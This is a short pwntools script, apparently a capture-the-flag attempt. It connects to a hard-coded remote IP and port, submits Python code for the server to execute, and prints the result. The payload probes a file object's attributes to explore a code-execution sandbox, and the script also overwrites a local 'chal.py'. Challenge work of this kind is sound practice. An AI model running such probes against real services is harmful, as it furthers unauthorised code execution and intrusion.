from pwn import remote
from numpy import iinfo
# nc 34.145.212.11 5000
r = remote('34.145.212.11', 5000, level='error')

code = """
print(dir(open('chal.py')))
"""
open('chal.py').write(code)
code += "$$END$$"
r.sendline(code.encode())
print(r.recvuntil(b"Execution result:").decode())
print(r.recvline().decode())
